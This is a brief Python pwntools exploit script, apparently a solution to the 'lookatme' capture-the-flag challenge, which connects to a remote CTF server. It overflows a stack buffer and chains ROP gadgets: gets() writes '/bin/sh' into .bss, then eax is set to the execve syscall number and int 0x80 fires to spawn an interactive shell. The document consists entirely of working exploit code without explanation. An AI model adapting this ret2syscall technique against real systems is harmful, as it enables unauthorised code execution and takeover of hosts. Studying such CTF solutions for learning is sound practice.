#!/usr/bin/python 
from pwn import * 
#p = process("./lookatme") 
p = remote("ctf.j0n9hyun.xyz", 3017) 
pop_eax = 0x80b81c6 
pop_edx_ecx_ebx = 0x806f050 
int_0x80 = 0x806f630 
gets_plt = 0x804f120 
bss = 0x080eaf80 

pay = 'A'*0x18 + 'B'*0x4 
pay += p32(gets_plt) + p32(pop_eax) + p32(bss) 
pay += p32(pop_eax) + "\x0b" + "\x00"*3 
pay += p32(pop_edx_ecx_ebx) + "\x00"*4 + "\x00"*4 + p32(bss) 
pay += p32(int_0x80) 

p.sendlineafter("\n", pay) 
p.sendline("/bin/sh\00") 

p.interactive()

